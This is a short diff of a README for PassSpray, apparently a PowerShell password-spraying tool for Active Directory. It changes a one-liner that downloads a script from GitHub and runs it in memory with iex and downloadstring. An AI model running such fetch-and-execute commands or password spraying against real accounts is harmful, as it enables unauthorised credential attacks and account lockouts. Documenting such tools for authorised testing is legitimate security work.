@@ -5,7 +5,7 @@ Important: Spraying passwords increases the Bad Pwd Count of the user you are tr
 
 ### Load PassSpray in memory
 ```
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Validate-Credentials/main/Validate-Credentials.ps1')
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/PassSpray/main/PassSpray.ps1')
 ```
 
 ### Spray Empty password
